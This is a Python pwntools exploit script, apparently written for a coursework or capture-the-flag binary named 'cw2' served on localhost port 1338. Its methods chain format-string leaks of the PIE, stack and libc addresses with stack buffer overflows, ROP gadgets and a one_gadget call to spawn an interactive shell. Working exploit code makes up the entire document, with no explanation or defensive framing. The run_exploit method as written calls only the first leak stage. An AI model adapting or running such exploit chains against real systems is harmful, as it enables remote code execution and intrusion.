from pwn import *

class StackExploit:
    def __init__(self):
        self.elf = ELF("./cw2", checksec=False)
        self.context = context
        self.context.terminal = ["tmux", "splitw", "-h"]
        self.context.arch = 'amd64'

        # Offsets
        self.libc_offset = 0x2a28b
        self.pop_rbp = 0x01213 - 3
        self.pie_base = None
        self.stack_leak = None
        self.libc_base = None

        # Process initialization
        #self.target = process("./cw2")
        self.target = remote("127.0.0.1", 1338)
        #self.target = self.elf.process()

    def leak_pie_base(self):
        # Initial overflow to leak PIE base
        self.target.sendline(b"%p:%p")
        self.target.sendline(b"2")
        self.target.sendline(b"1")
        self.target.sendline(b"100")
        self.target.sendline(b"1")
        self.target.sendlineafter(b"Enter the name of the item you need:", b"trash")

        # Change return address to point back to sendReq_admin()
        self.target.send(b"\x90"*176 + b"\x90"*8 + b"\xf3")

        # Extract and calculate PIE base
        program_leak = self.target.recvline_contains(b"Reason:").split(b"Reason:")[1][-6:]
        self.pie_base = u64(program_leak.ljust(8, b"\x00")) - 0x14f0
        log.info(f"PIE base: {hex(self.pie_base)}")

    def leak_stack_address(self):
        # Overflow to leak stack address
        self.target.sendlineafter(b"Enter the name of the item you need:", b"shell")
        payload = b"\x90"*176 + b"%p%p%p%p" + p64(self.pie_base + 0x12ac)
        self.target.sendlineafter(b"Your reason:", payload)

        # Process stack leak
        self.target.recvuntil(b"Thank you,")
        stack_leak = self.target.recvline()
        stack_leak_formatted = stack_leak[:-2].replace(b" ", b"")
        self.stack_leak = u64(stack_leak_formatted.ljust(8, b"\x00"))
        log.info(f"Stack leak: {hex(self.stack_leak)}")
        self.target.recvline()

    def leak_libc_address(self):
        # Format string exploit to leak libc address
        self.target.sendlineafter(b"Enter the name of the item you need:", b"shell")
        payload = b"%37$p"*34 + b"\x00"*14
        payload += p64(self.pie_base + self.pop_rbp)
        payload += p64(self.stack_leak + 40)
        payload += p64(self.pie_base + 0x001017)
        payload += p64(self.pie_base + 0x187d)

        self.target.sendlineafter(b"Your reason:", payload)
        self.target.recvline_contains(b"Reason:")

        # Calculate libc base
        libc_leak = self.target.recvline()[0:14]
        self.libc_base = int(libc_leak, 16) - self.libc_offset
        log.info(f"Libc base: {hex(self.libc_base)}")

    def execute_shell(self):
        # Final payload to get shell
        self.target.sendline(b"2")
        self.target.sendline(b"1")
        self.target.sendline(b"100")
        self.target.sendline(b"1")
        self.target.sendlineafter(b"Enter the name of the item you need:", b"trash")

        # Gadget offset
        one_gadget = 0xef52b
        eax = 0x00000000000018ae - 3
        ret = 0x000000000000101a - 3

        finalPayload = b"\x00"*176
        finalPayload += p64(self.stack_leak + 0x260)
        finalPayload += p64(self.pie_base + eax)
        finalPayload += p64(self.pie_base + ret)
        finalPayload += p64(self.pie_base + self.pop_rbp)
        finalPayload += p64(self.stack_leak + 0x218)
        finalPayload += p64(self.libc_base + one_gadget)

        self.target.send(finalPayload)
        self.target.interactive()

    def run_exploit(self):
        try:
            self.leak_pie_base()
            self.target.interactive()
            gdb.attach(self.target)


        except Exception as e:
            log.error(f"Exploit failed: {str(e)}")
            self.target.close()

if __name__ == "__main__":
    exploit = StackExploit()
    exploit.run_exploit()